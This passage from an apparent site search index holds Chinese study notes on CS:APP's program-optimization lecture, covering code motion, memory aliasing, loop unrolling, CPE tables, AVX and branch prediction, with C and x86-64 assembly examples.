val[i*n     + j+1];\nsum = up + down + left + right;\n</code></pre> <pre><code>leaq    1(%rsi), %rax # i+1\nleaq    -1(%rsi), %r8 # i-1\nimulq   %rcx, %rsi    # i*n\nimulq   %rcx, %rax    # (i+1)*n\nimulq   %rcx, %r8     # (i-1)*n\naddq    %rdx, %rsi    # i*n+j\naddq    %rdx, %rax    # (i+1)*n+j\naddq    %rdx, %r8     # (i-1)*n+j\n</code></pre> <p>\u4f18\u5316\u540e</p> <pre><code>long inj = i*n+j\nup =    val[inj - n];\ndown =  val[inj + n];\nleft =  val[inj - 1];\nright = val[inj + 1];\nsum = up + down + left + right;\n</code></pre> <pre><code>imulq   %rcx, %rsi        # i*n\naddq    %rdx, %rsi        # i*n+j\nmovq    %rsi, %rax        # i*n+j\nsubq    %rcx, %rax        # i*n+j-n\nleaq    (%rsi,%rcx), %rcx # i*n+n -&gt; i*n and then again\n</code></pre>"},{"location":"out_class_learning/freely_learning/CSAPP/L10-Program-Optimization/#optimization-blocker-1-procedure-calls","title":"\u4f18\u5316\u7684\u963b\u788d\u4e00\uff1a\u8fc7\u7a0b\u8c03\u7528 Optimization Blocker #1: Procedure Calls","text":"<p>Procedure to Convert String to Lower Case</p> <pre><code>void lower(char *s) {\n    size_t i;\n    for (i = 0; i &lt; strlen(s); i ++)\n        if (s[i] &gt;= 'A' &amp;&amp; s[i] &lt;= 'Z')\n            s[i] -= 'A' - 'a';\n}\n</code></pre> <p>Extracted from 213 lab submissions, Fall, 1998</p> <p>\u3010\u8fd9\u91cc\u6709\u4e00\u4e2a\u5173\u952e\u95ee\u9898\uff1a\u5faa\u73af\u65f6\u8c03\u7528\u4e86 <code>strlen()</code> \u800c\u5bf9\u8c61 <code>s</code> \u53d1\u751f\u4e86\u53d8\u5316\uff0c\u6240\u4ee5\u7f16\u8bd1\u5668\u4e0d\u6562\u5c06\u5b57\u7b26\u4e32\u957f\u56fa\u5b9a\u4e3a\u5e38\u6570\uff0c\u53ea\u56e0\u5b83\u4e0d\u61c2\u4ee3\u7801\uff0c\u8fd9\u5c31\u5bfc\u81f4\u6bcf\u6b21\u5faa\u73af\u90fd\u8c03\u7528\u8be5\u51fd\u6570\uff0c\u4f7f\u5f97\u6548\u7387\u52a3\u5316\u53ef\u89c2\uff1a\u672c\u5e94\u7ebf\u6027\u7684\u590d\u6742\u5ea6\u52a3\u5316\u5230\u4e86\u5e73\u65b9\u7ea7\u522b\u3002\u3011</p> <pre><code>void lower(char *s) {\n    size_t i;\n    size_t len = strlen(s);\n    for (i = 0; i &lt; len; i ++)\n        if (s[i] &gt;= 'A' &amp;&amp; s[i] &lt;= 'Z')\n            s[i] -= 'A' - 'a';\n}\n</code></pre> <p>Why couldn't compiler move <code>strlen</code> out of inner loop?</p> <p>\u200b   Procedure may have side effects</p> <p>\u200b       Alters global state each time called</p> <p>\u200b   Function may not return same value for given arguments</p> <p>\u200b       Depends on other paths of global state</p> <p>\u200b       Procedure <code>lower</code> could interact with <code>strlen</code> </p> <p>Warning:</p> <p>\u200b   Compiler treats procedure call as a black box</p> <p>\u200b   Weak optimizations near them</p> <p>Remedies:</p> <p>\u200b   Use of inline functions</p> <p>\u200b       GCC does this with <code>--O1</code></p> <p>\u200b           Within single file</p> <p>\u200b   Do your own code motion</p> <pre><code>size_t lencnt = 0;\nsize_t strlen(const char *s) {\n    size_t length = 0;\n    while (*s != 0) {\n        s++; length++;\n    }\n    lencnt += length;\n    return length;\n}\n</code></pre> <p>\u6bd4\u5982\u8bf4\u5728\u591a\u6587\u4ef6\u4e2d\u4f7f\u7528\u8fd9\u79cd\u81ea\u5df1\u5199\u7684\u540c\u540d\u51fd\u6570\uff0c\u4f7f\u7528\u8fd9\u79cd\u548c\u5e93\u51fd\u6570\u6709\u5dee\u5f02\u7684\u51fd\u6570\uff0c\u5728\u94fe\u63a5\u4e4b\u524d\uff08\u7f16\u8bd1\u5728\u94fe\u63a5\u4e4b\u524d\uff01\uff01\uff09\u6839\u672c\u65e0\u6cd5\u533a\u5206\uff0c\u7f16\u8bd1\u5668\u81ea\u7136\u53ea\u80fd\u5c06\u51fd\u6570\u5f53\u6210\u9ed1\u76d2\uff0c\u800c\u4e0d\u6562\u8f7b\u6613\u4f18\u5316\u7be1\u6539\u4e4b\u3002</p> <p>\u5185\u5b58\u5f88\u91cd\u8981 Memory Matters</p> <pre><code>/* Sum rows is of n X n matrix a and store in vector b */\nvoid sum_rows1(double *a, double *b, long n) {\n    long i, j;\n    for (i = 0; i &lt; n; i++) {\n        b[i] = 0;\n        for (j = 0; j &lt; n; j++)\n            b[i] += a[i*n + j];\n    }\n}\n</code></pre> <pre><code># sum_rows1 inner loop\n.L4:\n    movsd   (%rsi,%rax,8), %xmm0 # FP Load\n    addsd   (%rdi), %xmm0        # FP add\n    movsd   %xmm0, (%rsi,%rax,8) # FP store\n    addq    $8, %rdi\n    cmpq    %rcx, %rdi\n    jne     .L4\n</code></pre> <p>code updates <code>b[i]</code> on every iteration</p> <p>Why couldn't compiler optimize this away?</p> <p>\u5185\u5b58\u522b\u540d Memory Aliasing</p> <p>\u200b   \u522b\u540d\uff1a\u5f53\u7a0b\u5e8f\u7684\u4e0d\u540c\u90e8\u5206\u6307\u5411\u5185\u5b58\u4e2d\u7684\u76f8\u540c\u4f4d\u7f6e\uff0c\u79f0\u5176\u4e3a\u522b\u540d</p> <p>\u200b   C \u7f16\u8bd1\u5668\u5f88\u96be\u5feb\u901f\u5f97\u77e5\u662f\u5426\u6709\u5185\u5b58\u522b\u540d\u5f15\u7528</p> <pre><code>double A[9] =\n    { 0, 1,    2,\n      4, 8,   16,\n     32, 64, 128 };\ndouble *B = A + 3;\nsum_rows1(A, B, 3);\n</code></pre> <p>\u79fb\u9664\u522b\u540d Removing Aliasing</p> <pre><code>/* Sum rows is of n X n matrix a and store in vector b */\nvoid sum_rows1(double *a, double *b, long n) {\n    long i, j;\n    for (i = 0; i &lt; n; i++) {\n        double val\n        for (j = 0; j &lt; n; j++)\n            val += a[i*n + j];\n        b[i] = val;\n    }\n}\n</code></pre> <p>\u53ef\u80fd\u4f60\u6ca1\u770b\u61c2\uff0c\u56e0\u4e3a\u8fd9\u4e2a\u4f8b\u5b50\u5e76\u4e0d\u662f\u4e3a\u4e86\u8bf4\u660e\u6b63\u786e\u8ba1\u7b97\uff0c<code>B</code> \u7684\u5185\u5b58\u91cd\u53e0\u672c\u8eab\u5c31\u4f1a\u5bfc\u81f4\u8ba1\u7b97\u5f88\u96be\u6b63\u786e\u3002</p> <p>\u8fd9\u4e2a\u4f8b\u5b50\u662f\u8bf4\u660e\u5728\u5b58\u5728\u522b\u540d\u7684\u60c5\u51b5\u4e0b\uff0c\u8fdb\u884c\u8ba1\u7b97\u9700\u8981\u5f88\u591a\u5185\u5b58\u64cd\u4f5c\uff0c\u4ee5\u4fdd\u8bc1\u522b\u540d\u7684\u6b63\u786e\uff0c\u800c\u6211\u4eec\u5f80\u5f80\u4f1a\u88ab\u8fd9\u79cd\u522b\u540d\u7684\u7e41\u590d\u8ba1\u7b97\u7ed9\u62d6\u7d2f\u3002\u7f16\u8bd1\u5668\u4e0d\u77e5\u9053\u4f60\u7528\u522b\u540d\u662f\u4e0d\u5c0f\u5fc3\u7684\u8fd8\u662f\u6545\u610f\u7684\uff0c\u6240\u4ee5\u5c31\u6ca1\u6709\u4f18\u5316\u3002</p> <p>Optimization Blocker: Memory Aliasing</p> <p>Aliasing</p> <p>\u200b   Two different memory references specify single location</p> <p>\u200b   Easy to have happen in C</p> <p>\u200b       Since allowed to do address arithmetic</p> <p>\u200b       Direct access to storage structures</p> <p>\u200b   Get in habit of introducing local variables</p> <p>\u200b       Accumulating within loops</p> <p>\u200b       Your way of telling compiler not to check for aliasing</p>"},{"location":"out_class_learning/freely_learning/CSAPP/L10-Program-Optimization/#exploiting-instruction-level-parallelism","title":"\u5229\u7528\u6307\u4ee4\u7ea7\u522b\u5e76\u884c Exploiting Instruction-Level Parallelism","text":"<p>\u200b   \u9700\u8981\u6bd4\u8f83\u7406\u89e3\u73b0\u4ee3\u5904\u7406\u5668\u8bbe\u8ba1 Need general understanding of modern processor design</p> <p>\u200b       \u786c\u4ef6\u53ef\u4ee5\u5e76\u884c\u6267\u884c\u591a\u4e2a\u6307\u4ee4 Hardware can execute multiple instructions in parallel</p> <p>\u200b   \u8868\u73b0\u4f1a\u53d7\u9650\u4e8e\u6570\u636e\u4f9d\u8d56 Performance limited by data dependencies</p> <p>\u200b   \u7b80\u5355\u7684\u53d8\u5f62\u53ef\u4ee5\u5f97\u5230\u5de8\u5927\u8868\u73b0\u63d0\u5347 Simple transformations can yield dramatic performance improvement</p> <p>\u200b       \u7f16\u8bd1\u5668\u901a\u5e38\u4e0d\u4f1a\u505a\u8fd9\u4e9b\u53d8\u5f62 Compilers often cannot make these transformations</p> <p>\u200b       \u6d6e\u70b9\u6570\u8ba1\u7b97\u4e0d\u6ee1\u8db3\u7ed3\u5408\u5f8b\u548c\u5206\u914d\u5f8b Lack of associativity and distributivity in floating-point arithmetic</p>"},{"location":"out_class_learning/freely_learning/CSAPP/L10-Program-Optimization/#benchmark-example-data-type-for-vectors","title":"Benchmark Example: Data Type for Vectors","text":"<pre><code>/* data structure for vectors */\ntypedef struct {\n    size_t len;\n    data_t *data;\n} vec;\n/* retrieve vector element and store at val */\nint get_vec_element(*vec v, size_t idx, data_t *val) {\n    if (idx &gt;= v-&gt;len)\n        return 0;\n    *val = v-&gt;data[idx];\n    return 1;\n}\n</code></pre> <p>\u57fa\u51c6\u8ba1\u7b97 Benchmark Computation</p> <pre><code>void  combine1(vec_ptr v, data_t *dest) {\n    long int i;\n    *dest = IDENT;\n    for (i = 0; i &lt; vec_length(v); i++) {\n        data_t val;\n        get_vec_element(v, i, &amp;val);\n        *dest = *dest OP val;\n    }\n}\n</code></pre> <p>\u6ce8\uff1a\u6b64\u5904 <code>OP</code> \u662f\u4e00\u4e2a\u8fd0\u7b97\uff0c\u53ef\u4ee5\u662f\u52a0\u6cd5\u6216\u4e58\u6cd5\u7b49\u7b49\uff0c<code>IDENT</code> \u5219\u8868\u793a\u8be5\u8fd0\u7b97\u7684\u5355\u4f4d\u5143\uff08identity\uff09\uff0c\u4e0e\u4e4b\u5bf9\u5e94\u4e3a <code>0</code> \u6216 <code>1</code> \u7b49\u7b49\u3002</p> <p>\u8fdb\u884c\u4e00\u4e9b\u57fa\u672c\u7684\u4f18\u5316\uff1a</p> <pre><code>void combine4(vec_ptr v, data_t *dest) {\n    long i;\n    long length = vec_length(v);\n    data_t *d = get_vec_start(v);\n    data_t t = IDENT;\n    for (i = 0; i &lt; length; i++)\n        t = t OP d[i];\n    *dest = t;\n}\n</code></pre> <p>\u5904\u7406\u5355\u4e2a\u5143\u7d20\u7684\u6240\u82b1\u7684\u65f6\u95f4\u5468\u671f Cycles Per Element (CPE)</p> <p>\u200b   Convenient way to express performance of program that operates on vector or lists.</p> <p>\u200b   T = CPE * n + Overhead. \u6559\u6388\u7ed9\u51fa\u4e86\u5982\u4e0b\u8868\u683c\uff1a</p> Method\\CPE Integer - Double FP - Operation Add Mult Add Mult <code>Combine1</code> unoptimized 22.68 20.02 19.98 <code>Combine1</code> with <code>--O1</code> 10.12 10.12 10.17 11.14 <code>Combine4</code> 1.27 3.01 3.01 2.01 <p>\u73b0\u4ee3\u4e2d\u592e\u5904\u7406\u5668\uff08CPU\uff09\u8bbe\u8ba1 Modern CPU Design</p> <p>\u76f8\u5173\u7ec6\u8282\u4e13\u4e1a\u77e5\u8bc6\u53ef\u53c2\u8003\u8bfe\u7a0b ECE 741\uff08\u4e0b\u56fe\u7ed3\u6784\u5927\u81f4\u662f 1995 \u5e74\u7684\uff09</p> <p></p> <p>CPU \u5904\u7406\u6307\u4ee4\u91c7\u7528\u4e86\u4e00\u79cd\u79f0\u4f5c\u8d85\u6807\u91cf\u4e71\u5e8f\u6267\u884c\uff08superscalar out of order execution\uff09\u7684\u6280\u672f\uff0c\u8fd9\u79cd\u6280\u672f\u53ef\u4ee5\u7b80\u5355\u5730\u7406\u89e3\u4e3a CPU \u5c3d\u53ef\u80fd\u8bfb\u53d6\u66f4\u591a\u7684\u6307\u4ee4\uff0c\u5e76\u4e14\u5c3d\u91cf\u540c\u65f6\uff08\u5e76\u884c\uff09\u6267\u884c\u3001\u8ba1\u7b97\uff0c\u8fd9\u88ab\u79f0\u4e3a\u6307\u4ee4\u7ea7\u5e76\u884c\u6027\uff08instruction level parallelism\uff09\u3002</p> <p>\u8d85\u6807\u91cf\u5904\u7406\u5668 Superscalar Processor</p> <p>\u200b   Definition: A superscalar processor can issue and execute multiple instructions in one cycle. The instructions are retrieved from a sequential instruction stream and are usually scheduled dynamically.</p> <p>\u200b   Benefit: without programming effort, superscalar processor can take advantage of the instruction level parallelism that most programs hvae.</p> <p>\u200b   Most modern CPUs are superscalar.</p> <p>\u200b   Intel: since Pentium (1993)\uff08\u5954\u817e\uff09</p> <p>\u6d41\u6c34\u7ebf\u529f\u80fd\u5355\u5143 Pipelined Functional Units\u3010DLCO \u7684\u6d41\u6c34\u7ebf\u5386\u5386\u5728\u76ee\u3011</p> <pre><code>long mult_eg(long a, long b, long c) {\n    long p1 = a*b;\n    long p2 = a*c;\n    long p3 = p1*p2;\n    return p3;\n}\n</code></pre> Time - - - - - - - 1 2 3 4 5 6 7 Stage 1 <code>a*b</code> <code>a*c</code> <code>p1*p2</code> Stage 2 <code>a*b</code> <code>a*c</code> <code>p1*p2</code> Stage 3 <code>a*b</code> <code>a*c</code> <code>p1*p2</code> <p>\u200b   Divide computation into stages</p> <p>\u200b   Pass partial computations from stage to stage</p> <p>\u200b   Stage i can start on new computation once values passed to i+1</p> <p>\u200b   e.g. complete 3 multiplications in 7 cycels even though each requires 3 cycels.</p> <pre><code>Haswell CPU\n    8 Total Functional Units\n    Multiple instructions can execute in parallel\n        2 load, with address computation\n        1 store, with address computation\n        4 integer\n        2 FP multiply\n        1 FP add\n        1 FP divide\n    Some instructions take &gt; 1 cycle, but can be pipelined\nInstruction                Latency Cycles/Issue\nLoad/Store                 4       1\nInteger Multiply           3       1\nInteger/Long Divide        3-30    3-30\nSingle/Double FP Multiply  5       \nSingle/Double FP Add       3\nSingle/Double FP Divide    3-15     \n</code></pre> <p>Haswell \u662f Intel x86 \u7cfb\u5217\u7684\u6700\u65b0\u7248\u672c\u4e4b\u4e00\u3010\u6b64\u89c6\u9891\u65f6\u95f4\u4e3a 2015 \u5e74\u3011\uff0cLatency\uff1a\u5ef6\u8fdf\uff0cCycle/Issue\uff1a\u8868\u793a\u4e24\u4e2a\u6307\u4ee4\u9636\u6bb5\u4e4b\u95f4\u7684\u8ddd\u79bb\uff0c\u5982\u8868\u6240\u793a\uff0c\u9664\u6cd5\u6ca1\u6709\u6d41\u6c34\u7ebf\uff0c\u6548\u7387\u76f8\u5f53\u4f4e\u3002</p> <p>x86-64 Compilation of <code>Combine4</code></p> <pre><code># Inner Loop (Case: Integer Multiply)\n.L519:                          # Loop:\n    imull   (%rax,%rdx,4), %ecx # t = t * d[i]\n    addq    $1, %rdx            # i++\n    cmpq    %rdx, %rbp          # Compare length:i\n    jg      .L519               # if &gt;, go to Loop\n</code></pre> Method Integer - Double FP - Operation Add Mult Add Mult <code>Combine4</code> 1.27 3.01 3.01 5.01 Unroll 2*1 (Shown as Following) 1.01 3.01 3.01 5.01 Unroll 2*1a (Shown as Following) 1.01 1.51 1.51 2.51 Unroll 2*2 (Shown as Following) 0.81 1.51 1.51 2.51 Latency Bound 1.00 3.00 3.00 5.00 Throughput Bound 0.50 1.00 1.00 0.50 <p>\u5faa\u73af\u5c55\u5f00\u6280\u672f Loop Unrolling (2*1)</p> <pre><code>void unroll2a_combine(vec_ptr v, data_t *dest) {\n    long length = vec_length(v);\n    long limit = length-1;\n    data_t *d = get_vec_start(v);\n    data_t x = IDENT;\n    long i;\n    /* Combine 2 elements at a time */\n    for (i = 0; i &lt; limit; i+=2) {\n        x = (x OP d[i]) OP d[i+1];\n    }\n    /* Finish any remaining elements */\n    for (; i &lt; length; i++) {\n        x = x OP d[i];\n    }\n    *dest = x;\n}\n</code></pre> <p>\u5faa\u73af\u5c55\u5f00\u7684\u57fa\u672c\u601d\u60f3\u662f\u5728\u4e00\u6b21\u5faa\u73af\u4e2d\u8ba1\u7b97\u591a\u4e2a\u503c\u800c\u4e0d\u662f\u4e00\u4e2a\u503c\uff0c\u8fd9\u6837\u53ef\u4ee5\u51cf\u5c11\u8ba1\u6570\u548c\u5206\u652f\u9884\u6d4b\u9519\u8bef\u7684\u4ee3\u4ef7\u3002</p> <p>\u200b   Helps integer add</p> <p>\u200b       Achieves latency bound</p> <p>\u200b   Others don't improve. Why?</p> <p>\u200b       Still sequential dependency</p> <p>\u5faa\u73af\u5c55\u5f00+\u91cd\u65b0\u52a0\u62ec\u53f7 Loop Unrolling with Reassociation (2*1a)</p> <p>\u5c06 <code>unroll2a_combine()</code> \u6539\u4e3a <code>unroll2aa_combine()</code> \u5176\u4e2d <code>x = (x OP d[i]) OP d[i+1];</code> \u6539\u4e3a <code>x = x (OP d[i] OP d[i+1]);</code></p> <p>\u5de6\u4fa7\u7684\u56fe\u79f0\u4e3a\u6570\u636e\u6d41\u56fe\u3002\u6b64\u65f6\u4e24\u4e2a <code>d[?]</code> \u8ba1\u7b97\u4e0d\u4f9d\u8d56 <code>x</code>\uff0c\u8fd9\u4f7f\u5f97\u4ee3\u7801\u53ef\u4ee5\u5e76\u884c\u8ba1\u7b97\uff0c\u4ece\u800c\u8ba1\u7b97\u65f6\u95f4\u51cf\u534a\u3002</p> <p>\u6ce8\u610f\uff01\u8fd9\u79cd\u64cd\u4f5c\u5bf9\u4e8e\u6d6e\u70b9\u6570\u6709\u98ce\u9669\uff0c\u56e0\u4e3a\u6d6e\u70b9\u6570\u8ba1\u7b97\u4e0d\u6ee1\u8db3\u7ed3\u5408\u5f8b\uff0c\u4e0d\u8fc7\u5982\u679c\u4e0d\u8003\u8651\u820d\u5165\u3001\u7cbe\u5ea6\u4ec0\u4e48\u7684\uff0c\u90a3\u4e5f\u53ef\u4ee5\u7528\u8fd9\u79cd\u4f18\u5316\uff0c\u53e6\u5916\u7f16\u8bd1\u5668\u4e5f\u6b63\u662f\u56e0\u4e3a\u8fd9\u4e2a\u539f\u56e0\uff0c\u5bf9\u4e8e\u6d6e\u70b9\u6570\u8ba1\u7b97\u7684\u4f18\u5316\u975e\u5e38\u4fdd\u5b88\uff0c\u5728\u6d6e\u70b9\u6570\u76f8\u5173\u8ba1\u7b97\u7684\u65f6\u5019\uff0c\u4f60\u6700\u597d\u624b\u52a8\u4f18\u5316\u3002</p> <p></p> <p>\u5ef6\u8fdf\u754c\u9650\uff08latency bound\uff09\uff1a\u5728\u4e00\u7cfb\u5217\u64cd\u4f5c\u5fc5\u987b\u4e25\u683c\u987a\u5e8f\u6267\u884c\u65f6\uff0c\u6267\u884c\u4e00\u6761\u6307\u4ee4\u6240\u8981\u82b1\u8d39\u7684\u5168\u90e8\u65f6\u95f4\u3002</p> <p>\u541e\u5410\u91cf\u754c\u9650\uff08throughput bound\uff09\u57fa\u4e8e\u786c\u4ef6\u7684\u6570\u91cf\u548c\u6027\u80fd\u3001\u57fa\u4e8e\u529f\u80fd\u5355\u5143\u7684\u539f\u59cb\u8ba1\u7b97\u80fd\u529b\uff0c\u6240\u4ee5\u4f60\u5728\u8868\u4e2d\u770b\u5230\u6d6e\u70b9\u6570\u4e58\u6cd5\u7684\u541e\u5410\u91cf\u754c\u9650\u66f4\u5c0f\uff0c\u662f\u56e0\u4e3a\u6211\u4eec\u4e4b\u524d\u5c55\u793a\u7684 Haswell CPU \u6709\u4e24\u4e2a\u6d6e\u70b9\u6570\u4e58\u6cd5\u5355\u5143\uff0c\u4f46\u53ea\u6709\u4e00\u4e2a\u6d6e\u70b9\u6570\u52a0\u6cd5\u5355\u5143\u3002</p> <pre><code>void unroll2a_combine(vec_ptr v, data_t *dest) {\n    long length = vec_length(v);\n    long limit = length-1;\n    data_t *d = get_vec_start(v);\n    data_t x0 = IDENT;\n    data_t x1 = IDENT;\n    long i;\n    for (i = 0; i &lt; limit; i += 2) {\n        x0 = x0 OP d[i];\n        x1 = x1 OP d[i+1];\n    }\n    for (; i &lt; length; i++) {\n        x0 = x0 OP d[i];\n    }\n    *dest = x0 OP x1;\n}\n</code></pre> <p>\u8fd9\u79cd\u5faa\u73af\u5c55\u5f00\u76f8\u5f53\u4e8e\u663e\u5f0f\u5730\u5e76\u884c\u3002</p> <p>\u5faa\u73af\u5c55\u5f00\u548c\u7d2f\u8ba1 Unrolling &amp; Accumulating</p> <p>\u200b   Idea</p> <p>\u200b       Can unroll to any degree L</p> <p>\u200b       Can accumulate K results in parallel</p> <p>\u200b       L must be multiple of K</p> <p>\u200b   Limitations</p> <p>\u200b       Diminishing returns</p> <p>\u200b           Cannot go beyond throughout limitations of execution units</p> <p>\u200b       Large overhead for short lengths</p> <p>\u200b           Finish off iterations sequentially</p> <p>\u200b   Case</p> <p>\u200b       Intel Haswell</p> <p>\u200b       Double FP Multiplication</p> <p>\u200b       Latency boud: 5.00. Throughput bound: 0.50</p> FP Mult Unrolling FactorL - - - - - - - K 1 2 3 4 6 8 10 12 1 5.01 5.01 5.01 5.01 5.01 5.01 5.01 2 2.51 2.51 2.51 3 1.67 4 1.25 1.26 6 0.84 0.88 8 0.63 10 0.51 12 <p>\u57fa\u672c\u4e0a\u6781\u9650\u662f\u541e\u5410\u91cf\u754c\u9650\uff0c\u5f53\u7136\u4e4b\u540e\u4f60\u5fc5\u987b\u8003\u8651\u7684\u74f6\u9888\u5c31\u53d8\u6210\u4e86\u4e00\u4e9b\u989d\u5916\u7684\u51c6\u5907\u5f00\u9500\u800c\u4e0d\u53ea\u662f CPE.</p> <p>\u6211\u4eec\u4e4b\u524d\u8c08\u8fc7 SSE\uff0c\u73b0\u5728\u6765\u8c08\u8c08 AVX\uff0c\u5176\u4f7f\u7528 YMM \u5bc4\u5b58\u5668\u4f5c\u4e3a\u6d6e\u70b9\u6570\u5bc4\u5b58\u5668\u800c\u4e0d\u662f XMM \u5bc4\u5b58\u5668\uff0c\u5176\u5927\u5c0f\u662f\u540e\u8005\u7684\u4e24\u500d\uff0cIntel \u8fd8\u6253\u7b97\uff08\u89c6\u9891\u65f6\u95f4\u4e3a 2015 \u5e74\uff09\u5728\u4e00\u5e74\u5185\u63a8\u51fa\u65b0\u7684 AVX512 \u7248\u672c\uff0c\u5176\u5bc4\u5b58\u5668\u4e3a 512 \u4f4d\uff0c\u957f\u5ea6\u4e3a 64 \u5b57\u8282\uff0c\u662f YMM \u5bc4\u5b58\u5668\u7684\u4e24\u500d\u957f\u3002</p> <pre><code>Programming with AVX2\nYMM Registers\n16 total, each 32 bytes\n    32 single-byte integers\n    16 16-bit integers\n    8 32-bit integers\n    8 single-precision floats\n    4 double-precision floats\n    1 single-precision float\n    1 double-precision float\n</code></pre> <pre><code>vaddsd %ymm0, %ymm1, %ymm1\nvaddpd %ymm0, %ymm1, %ymm1\n\u7b49\u65b0\u7684\u77e2\u91cf\u8fd0\u7b97\u6307\u4ee4\u4e5f\u88ab\u6dfb\u52a0\u4e86\u3002\n</code></pre> <p>\u4f7f\u7528\u77e2\u91cf\u6307\u4ee4 Using Vector Instructions</p> Method\\CPE Integer - Double FP - Operation Add Mult Add Mult Scalar Best 0.54 1.01 1.01 0.52 Vector Best 0.06 0.24 0.25 0.16 Latency Bound 0.50 3.00 3.00 5.00 Throughput Bound 0.50 1.00 1.00 0.50 Vec Throughput Bound 0.06 (0.0625) 0.12 0.25 0.12 <p>Make use of AVX Instructions</p> <p>\u200b   Parallel operations on multiple data elements</p> <p>\u200b   See Web Aside OPT: SIMD on CS: APP web page</p> <p>\u8fd9\u79cd\u6d6e\u70b9\u6570\u7684\u5feb\u901f\u8fd0\u7b97\u662f\u56e0\u4e3a\u8f6f\u4ef6\uff0c\u7279\u522b\u662f\u6e38\u620f\u9700\u8981\u6e32\u67d3\uff0c\u5176\u4e2d\u5173\u4e8e\u56fe\u50cf\u3001\u8fd0\u52a8\u5904\u7406\u7b49\u7b49\u7528\u5230\u4e86\u5927\u91cf\u6d6e\u70b9\u6570\u8fd0\u7b97\uff0c\u8fd9\u6837\u4e00\u79cd\u9700\u6c42\u3002GCC \u66fe\u60f3\u5c1d\u8bd5\u8ba9\u8fd9\u79cd\u4f18\u5316\u5728\u7f16\u8bd1\u5668\u5185\u5b8c\u6210\uff0c\u4f46\u6548\u679c\u90fd\u4e0d\u597d\uff0c\u6240\u4ee5\u6700\u7ec8\u662f\u4ea4\u7ed9\u4e86\u4e0b\u6e38\u7684\u786c\u4ef6\u548c\u4e0a\u6e38\u7684\u4ee3\u7801\u7f16\u5199\u8005\u53bb\u5904\u7406\u3002</p> <p>\u6b64\u5904\u7684\u7f51\u9875\u65c1\u6ce8\uff0c\u5c31\u662f\u63d0\u793a\u4f60\u5982\u4f55\u6253\u5f00\u5411\u91cf\uff08\u77e2\u91cf\uff09\u5316\u7f16\u7a0b\u8fd9\u4e2a\u9886\u57df\u7684\u5927\u95e8\u4ee5\u53ca GCC \u5f53\u5e74\u6269\u5c55\u7684\u5c1d\u8bd5\u3002</p>"},{"location":"out_class_learning/freely_learning/CSAPP/L10-Program-Optimization/#what-about-branches","title":"What About Branches?","text":"<p>Challenge</p> <p>\u200b   Instruction Control Unit must work well ahead of Execution Unit to generate enough operations to keep EU busy.</p> <p>\u200b   When encounters conditional branch, cannot reliably determine where to continue fetching.</p> <p>\u200b       Branch Taken: Transfer control to branch target</p> <p>\u200b       Branch Not-Taken: Continue with next instruction in sequence.</p> <p>\u200b   Cannot resolve until outcome determined by branch/integer unit.</p> <p>\u5206\u652f\u9884\u6d4b\u6280\u672f Branch Prediction\u3010\u6b64\u9879\u4f18\u5316\u6280\u672f\u5728 DLCO \u4e2d\u4ea6\u6709\u63d0\u53ca\uff0c\u79f0\u4f5c\u5206\u652f\u9884\u6d4b\u6280\u672f\u3002\u6d41\u6c34\u7ebf\u6280\u672f\u3001\u5206\u652f\u9884\u6d4b\u6280\u672f\u3001\u9884\u6d4b\u8868\u3001\u6d41\u6c34\u7ebf\u51b2\u5237\u2026\u2026\u3011</p> <p>\u200b   Idea</p> <p>\u200b       Guess which way branch will go</p> <p>\u200b       Begin executing instructions at predicted position</p> <p>\u200b           But don't actually modify register or memory data</p> <p>Branch Prediction Through Loop, Branch Misprediction Invalidation, Branch Misprediction Recovery</p> <p>\uff08\u8fd9\u9879\u6280\u672f\u6700\u5173\u952e\u7684\u4e00\u70b9\u5c31\u662f\uff0c\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\u4ec5\u4f7f\u7528\u5bc4\u5b58\u5668\uff0c\u5e76\u4e14\u673a\u5668\u7559\u6709\u5bc4\u5b58\u5668\u7684\u5907\u4efd\uff0c\u8fd9\u6837\u9884\u6d4b\u9519\u8bef\u5c31\u53ef\u4ee5\u4e22\u6389\u6240\u6709\u5df2\u53d6\u7684\u6307\u4ee4\uff0c\u56de\u9000\u6240\u6709\u90e8\u5206/\u5168\u90e8\u8ba1\u7b97\u5b8c\u6bd5\u7684\u6307\u4ee4\uff0c\u63a5\u7740\u7ee7\u7eed\u8fdb\u884c\u4e0b\u53bb\u3002\u5bc4\u5b58\u5668\u5907\u4efd\u7684\u5730\u65b9\u53eb\u505a\u5bc4\u5b58\u5668\u91cd\u547d\u540d\u5757\uff08register renaming unit\uff09\uff0c\u5bc4\u5b58\u5668\u5907\u4efd\u7684\u6570\u91cf\u6709\u51e0\u767e\u4e2a\u4e4b\u591a\uff09</p> <p>\u6761\u4ef6\u8df3\u8f6c\uff08conditional jump\uff09\u548c\u6761\u4ef6\u5206\u652f\uff08conditional operation\uff09\u7684\u533a\u522b\uff08\u4e66 P145\uff09\uff0c\u6761\u4ef6\u8df3\u8f6c\u53ef\u4ee5\u5728\u6d41\u6c34\u7ebf\u4e2d\u8fdb\u884c\uff0c\u5373\u4f7f\u7528\u5982\u4e0a\u6240\u8ff0\u7684\u4f18\u5316\u6280\u672f\uff0c\u800c\u6761\u4ef6\u5206\u652f\u4ee3\u7801\u5219\u662f\u66f4\u9ad8\u4e00\u7ea7\uff0c\u5728\u7f16\u7a0b\u7ea7\u522b\u7684\u62bd\u8c61\uff0c\u4e0e\u4e4b\u4e0d\u53ef\u6df7\u6dc6\u3002</p> <p>Getting High Performance</p> <p>\u200b   Good compiler and flags</p> <p>\u200b   Don't do anything stupid</p> <p>\u200b       Watch out for hidden algorithmic inefficiencies</p> <p>\u200b       Write compiler-friendly code</p> <p>\u200b           Watch out for optimization blockers: procedure calls &amp; memory references</p> <p>\u200b       Look carefully at innermost loops (where most work is done)</p> <p>\u200b   Tune code for machine</p> <p>\u200b       Exploit instruction-level parallelism</p> <p>\u200b       Avoid unpredictable branches</p> <p>\u200b       Make code cache friendly (Covered later in course)</p> <p>\u200b       </p>"},{"location":"out_class_learning/freely_learning/CSAPP/L11-The-Memory-Hierarchy/","title":"L11 The Memory Hierarchy","text":"<p>Source: https://www.bilibili.com/video/BV1iW411d7hd?p=11</p> <p>Today\uff08\u5b58\u50a8\u5668\u5c42\u6b21\u7ed3\u6784 memory hierarchy\uff09</p> <p>\u200b   \u5b58\u50a8\u6280\u672f\u53ca\u8d8b\u52bf Storage technologies and trends</p> <p>\u200b   \u5f15\u7528\u7684\u672c\u5730\u6027 Locality of reference</p> <p>\u200b   \u5b58\u50a8\u5668\u5c42\u6b21\u7ed3\u6784\u4e2d\u7684\u7f13\u5b58 Caching in the memory hierarchy</p> 